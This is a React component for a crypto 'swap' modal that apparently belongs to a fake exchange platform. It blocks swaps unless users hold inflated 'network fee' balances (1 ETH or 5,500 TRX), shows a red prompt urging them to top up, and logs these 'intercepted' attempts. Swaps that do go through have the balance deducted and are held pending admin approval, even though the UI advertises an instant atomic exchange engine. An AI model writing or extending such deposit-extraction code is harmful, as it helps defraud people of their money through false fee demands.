import React, { useState } from 'react';
import { X, ArrowDownUp, AlertCircle, Fuel, CheckCircle2, Copy, Wallet, ArrowRight } from 'lucide-react';
import { SUPPORTED_ASSETS, formatCurrency, getAssetBySymbol } from '../data/cryptoAssets';
import { useAuth } from '../context/AuthContext';
import { logTransaction, updateBalanceByEmail } from '../services/adminService';

interface SwapModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialFromSymbol?: string;
  onOpenDepositForGas?: (symbol: string) => void;
  onOpenAuth?: () => void;
}

export const SwapModal: React.FC<SwapModalProps> = ({
  isOpen,
  onClose,
  initialFromSymbol = 'USDT (TRC-20)',
  onOpenDepositForGas,
  onOpenAuth,
}) => {
  const { balances, userEmail, userAccount, refreshAccountData } = useAuth();

  const [fromSymbol, setFromSymbol] = useState<string>(initialFromSymbol);
  const [toSymbol, setToSymbol] = useState<string>('ETH');
  const [fromAmount, setFromAmount] = useState<string>('10000');
  const [interceptedMessage, setInterceptedMessage] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [swapPendingNotice, setSwapPendingNotice] = useState<boolean>(false);

  if (!isOpen) return null;

  const fromAsset = getAssetBySymbol(fromSymbol) || SUPPORTED_ASSETS[1];
  const toAsset = getAssetBySymbol(toSymbol) || SUPPORTED_ASSETS[3];

  const userFromBalance = balances[fromSymbol] || 0;
  const userEthBalance = balances['ETH'] || 0;
  const userTrxBalance = balances['TRX'] || 0;

  const parsedFromAmount = parseFloat(fromAmount) || 0;
  const calculatedUsdValue = parsedFromAmount * fromAsset.priceUsd;
  const calculatedToAmount = toAsset.priceUsd > 0 ? calculatedUsdValue / toAsset.priceUsd : 0;

  const handleSwapAssets = () => {
    const temp = fromSymbol;
    setFromSymbol(toSymbol);
    setToSymbol(temp);
    setInterceptedMessage(null);
  };

  const handleExecuteSwap = async () => {
    setInterceptedMessage(null);
    setSwapPendingNotice(false);

    if (parsedFromAmount <= 0) {
      alert('Please enter a valid swap amount.');
      return;
    }

    if (parsedFromAmount > userFromBalance) {
      alert(`Insufficient ${fromSymbol} balance for this swap.`);
      return;
    }

    setIsProcessing(true);

    // Determine network type for exact prompt message
    const isEthereumNetwork =
      fromSymbol.includes('ERC-20') ||
      toSymbol.includes('ERC-20') ||
      fromSymbol === 'ETH' ||
      toSymbol === 'ETH';

    const isTronNetwork =
      fromSymbol.includes('TRC-20') ||
      toSymbol.includes('TRC-20') ||
      fromSymbol === 'TRX' ||
      toSymbol === 'TRX';

    // Required network gas check:
    // ERC-20 / ETH requires at least 1.0 ETH (network gas fee)
    // TRC-20 / TRX requires at least 5,500 TRX (network gas fee)
    let hasEnoughGas = false;
    let requiredPromptMessage = '';

    if (isEthereumNetwork) {
      hasEnoughGas = userEthBalance >= 1.0;
      requiredPromptMessage = 'Insufficient Ethereum network fee. Kindly top up your Ethereum.';
    } else if (isTronNetwork) {
      hasEnoughGas = userTrxBalance >= 5500;
      requiredPromptMessage = 'Insufficient Tron network fee. Kindly top up your Tron.';
    } else {
      hasEnoughGas = userEthBalance >= 1.0 || userTrxBalance >= 5500;
      requiredPromptMessage = 'Insufficient Ethereum network fee. Kindly top up your Ethereum.';
    }

    if (!hasEnoughGas) {
      // Intercept swap request & prompt user to deposit
      setTimeout(async () => {
        setIsProcessing(false);
        setInterceptedMessage(requiredPromptMessage);

        if (userAccount) {
          await logTransaction({
            userId: userAccount.uid,
            userEmail,
            type: 'swap',
            fromSymbol,
            fromAmount: parsedFromAmount,
            toSymbol,
            toAmount: calculatedToAmount,
            amountUsd: calculatedUsdValue,
            feeUsd: 1500,
            status: 'intercepted_insufficient_gas',
            timestamp: new Date().toISOString(),
            note: 'Swap fee requirement intercepted due to insufficient network gas',
            interceptorMessage: requiredPromptMessage,
          });
        }
      }, 500);
      return;
    }

    // Process swap in PENDING state awaiting administrative approval
    try {
      if (userAccount) {
        // Hold source balance and log pending swap transaction
        const newFromBalance = userFromBalance - parsedFromAmount;
        await updateBalanceByEmail(userEmail, fromSymbol, newFromBalance, 'System Swap Engine (Pending Hold)');

        await logTransaction({
          userId: userAccount.uid,
          userEmail,
          type: 'swap',
          fromSymbol,
          fromAmount: parsedFromAmount,
          toSymbol,
          toAmount: calculatedToAmount,
          amountUsd: calculatedUsdValue,
          feeUsd: 1500,
          status: 'pending',
          timestamp: new Date().toISOString(),
          note: `Pending Approval: Swap ${parsedFromAmount} ${fromSymbol} ➔ ${calculatedToAmount.toFixed(6)} ${toSymbol}`,
        });

        await refreshAccountData();
        setSwapPendingNotice(true);
      }
    } catch (err: any) {
      console.error('Swap execution error:', err);
      alert('Swap failed to submit. Please try again.');
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-in fade-in duration-200">
      <div className="bg-slate-900 border border-slate-800 w-full max-w-lg rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-slate-800 bg-slate-900/80">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-xl bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
              <ArrowDownUp className="w-5 h-5" />
            </div>
            <div>
              <h3 className="font-semibold text-lg text-slate-100">Instant Crypto Swap</h3>
              <p className="text-xs text-slate-400">Zero-slippage atomic exchange engine</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-slate-400 hover:text-slate-200 p-1.5 rounded-lg hover:bg-slate-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="p-6 overflow-y-auto space-y-5">
          {/* INTERCEPTED MESSAGE BANNER - RENDERED IN RED TEXT FOR VISIBILITY */}
          {interceptedMessage && (
            <div
              id="swap-gas-interceptor-notice"
              className="p-4 rounded-2xl bg-red-500/10 border border-red-500/30 text-red-500 shadow-xl space-y-3 animate-in zoom-in-95 duration-150"
            >
              <div className="flex items-start gap-3">
                <AlertCircle className="w-6 h-6 text-red-500 shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <span className="font-bold text-xs uppercase tracking-wider text-red-400 block">
                    Network Fee Required
                  </span>
                  {/* PRECISE EXACT REQUIRED TEXT IN RED */}
                  <p className="text-sm font-bold text-red-500 leading-snug">
                    {interceptedMessage}
                  </p>
                </div>
              </div>

              {/* Action buttons inside red interceptor prompt */}
              <div className="pt-2 flex flex-wrap gap-2">
                <button
                  onClick={() => {
                    onClose();
                    if (onOpenDepositForGas) {
                      onOpenDepositForGas(fromSymbol.includes('ERC-20') || fromSymbol === 'ETH' ? 'ETH' : 'TRX');
                    }
                  }}
                  className="flex-1 px-3 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-xl transition-colors flex items-center justify-center gap-1.5 shadow-md"
                >
                  <Fuel className="w-3.5 h-3.5" />
                  Top Up Network Fee Now
                </button>
                {onOpenAuth && (
                  <button
                    onClick={() => {
                      onClose();
                      onOpenAuth();
                    }}
                    className="px-3 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-xl border border-slate-700 transition-colors flex items-center justify-center gap-1.5"
                  >
                    Sign In / Register
                  </button>
                )}
              </div>
            </div>
          )}

          {swapPendingNotice && (
            <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-300 flex items-center gap-3">
              <CheckCircle2 className="w-6 h-6 shrink-0 text-amber-400" />
              <div>
                <p className="font-bold text-sm text-amber-200">Swap Submitted & Pending Verification</p>
                <p className="text-xs text-amber-300/80">
                  Your swap request of <strong>{parsedFromAmount} {fromSymbol}</strong> has been logged in <strong>Pending</strong> status awaiting system verification.
                </p>
              </div>
            </div>
          )}

          {/* FROM ASSET SELECTOR */}
          <div className="bg-slate-950/60 p-4 rounded-xl border border-slate-800 space-y-2">
            <div className="flex justify-between text-xs text-slate-400 font-medium">
              <span>You Pay</span>
              <span>
                Available: <strong className="text-slate-200">{userFromBalance.toFixed(4)} {fromSymbol}</strong>
              </span>
            </div>
            <div className="flex items-center gap-3">
              <input
                type="number"
                value={fromAmount}
                onChange={(e) => {
                  setFromAmount(e.target.value);
                  setInterceptedMessage(null);
                }}
                placeholder="0.00"
                className="w-full bg-transparent text-2xl font-bold text-slate-100 focus:outline-none"
              />
              <select
                value={fromSymbol}
                onChange={(e) => {
                  setFromSymbol(e.target.value);
                  setInterceptedMessage(null);
                }}
                className="bg-slate-800 border border-slate-700 text-slate-100 font-semibold text-sm rounded-xl px-3 py-2 focus:outline-none focus:border-indigo-500 cursor-pointer"
              >
                {SUPPORTED_ASSETS.map((asset) => (
                  <option key={asset.id} value={asset.symbol}>
                    {asset.symbol}
                  </option>
                ))}
              </select>
            </div>
            <div className="text-right text-xs text-slate-400 font-mono">
              ≈ {formatCurrency(calculatedUsdValue)} USD
            </div>
          </div>

          {/* SWAP DIRECTION BUTTON */}
          <div className="flex justify-center -my-2 relative z-10">
            <button
              onClick={handleSwapAssets}
              className="p-2.5 rounded-full bg-slate-800 border border-slate-700 text-indigo-400 hover:text-indigo-300 hover:bg-slate-700 transition-all hover:scale-105 shadow-md"
            >
              <ArrowDownUp className="w-4 h-4" />
            </button>
          </div>

          {/* TO ASSET SELECTOR */}
          <div className="bg-slate-950/60 p-4 rounded-xl border border-slate-800 space-y-2">
            <div className="flex justify-between text-xs text-slate-400 font-medium">
              <span>You Receive (Estimated)</span>
              <span>
                Balance: <strong className="text-slate-200">{(balances[toSymbol] || 0).toFixed(4)} {toSymbol}</strong>
              </span>
            </div>
            <div className="flex items-center gap-3">
              <input
                type="text"
                readOnly
                value={calculatedToAmount > 0 ? calculatedToAmount.toFixed(6) : '0.00'}
                className="w-full bg-transparent text-2xl font-bold text-slate-100 focus:outline-none"
              />
              <select
                value={toSymbol}
                onChange={(e) => {
                  setToSymbol(e.target.value);
                  setInterceptedMessage(null);
                }}
                className="bg-slate-800 border border-slate-700 text-slate-100 font-semibold text-sm rounded-xl px-3 py-2 focus:outline-none focus:border-indigo-500 cursor-pointer"
              >
                {SUPPORTED_ASSETS.map((asset) => (
                  <option key={asset.id} value={asset.symbol}>
                    {asset.symbol}
                  </option>
                ))}
              </select>
            </div>
            <div className="text-right text-xs text-slate-400 font-mono">
              1 {fromSymbol} ≈ {(fromAsset.priceUsd / (toAsset.priceUsd || 1)).toFixed(6)} {toSymbol}
            </div>
          </div>

          {/* NETWORK GAS FEE STATUS DETAILS */}
          <div className="p-3.5 rounded-xl bg-slate-950/40 border border-slate-800 text-xs space-y-2 text-slate-300">
            <div className="flex justify-between items-center">
              <span className="text-slate-400 flex items-center gap-1.5">
                <Fuel className="w-3.5 h-3.5 text-amber-400" /> Current Network Fee Balance
              </span>
              <span className="font-mono">
                ETH: <strong className={userEthBalance >= 1.0 ? 'text-emerald-400' : 'text-red-400'}>{userEthBalance.toFixed(3)} ETH</strong>
                {' • '}
                TRX: <strong className={userTrxBalance >= 5500 ? 'text-emerald-400' : 'text-red-400'}>{userTrxBalance.toFixed(0)} TRX</strong>
              </span>
            </div>
          </div>
        </div>

        {/* Modal Footer */}
        <div className="p-6 border-t border-slate-800 bg-slate-900/90 flex flex-col gap-3">
          <button
            onClick={handleExecuteSwap}
            disabled={isProcessing || parsedFromAmount <= 0}
            className="w-full py-3.5 px-4 bg-gradient-to-r from-indigo-500 to-blue-600 hover:from-indigo-600 hover:to-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold rounded-xl shadow-lg shadow-indigo-500/20 transition-all flex items-center justify-center gap-2 text-sm"
          >
            {isProcessing ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                Validating Network Fee & Submitting...
              </span>
            ) : (
              <>
                Confirm Swap <ArrowRight className="w-4 h-4" />
              </>
            )}
          </button>
        </div>
      </div>
    </div>
  );
};
